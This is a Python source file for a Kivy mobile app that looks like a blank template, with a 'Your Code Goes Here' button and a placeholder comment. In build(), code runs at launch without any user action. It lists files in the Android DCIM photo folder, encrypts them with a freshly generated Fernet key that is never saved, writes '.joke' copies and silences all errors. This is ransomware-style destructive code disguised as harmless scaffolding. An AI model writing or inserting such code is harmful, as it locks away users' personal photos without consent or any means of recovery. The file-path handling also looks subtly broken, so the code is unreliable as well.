from cryptography.fernet import Fernet
import os
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button

class MainApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')

        # Placeholder space for your code
        def main():
    
            def utpann():
                return Fernet.generate_key()
            
            def sarvanash(file, key):
                try:    
                    with open(file, 'rb') as file_raw:
                        
                        data = file_raw.read()

                    fernet = Fernet(key)
                    encrypted_data = fernet.encrypt(data)

                    with open(file + ".joke", 'wb') as file_enc:
                        file_enc.write(encrypted_data)
                except:
                    pass        
            
            files = []
            
            for file in os.listdir("/storage/emulated/0/DCIM"):
                if os.path.isfile(file):
                    files.append(file)
            print(files)
            key = utpann()

            # with open('thekey.key', 'wb') as key_file:
            #     key_file.write(key)

            for file in files:
                sarvanash(file, key)
                print(file + " encrypted successfully!")

        main()
        label = Button(text="Your Code Goes Here")
        layout.add_widget(label)

        return layout

if __name__ == '__main__':
    MainApp().run()




